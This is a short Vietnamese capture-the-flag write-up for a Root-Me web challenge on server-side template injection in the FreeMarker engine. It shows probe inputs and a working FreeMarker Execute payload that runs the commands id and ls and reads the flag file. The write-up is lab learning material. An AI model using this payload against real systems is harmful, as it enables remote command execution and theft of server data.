Challenge: http://challenge01.root-me.org/web-serveur/ch41/

Vào trang web thử với input bình thường:
![alt text](image-2.png)

Sau đó thử với các input `${7*7}`, `{{7*7}}`, ... và ra kết quả là `${7*7}`
![alt text](image-3.png)
![alt text](image-4.png)

Ở đây ta thấy response trả về có thông tin về engine:
![alt text](image-5.png)

Ta sẽ thử inject 1 lệnh để chạy command trong engine FreeMaker:\
`<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}`
![alt text](image-6.png)

Tiếp tục:
`<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("ls")}`
![alt text](image-7.png)

`<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("cat SECRET_FLAG.txt")}`
![alt text](image-8.png)







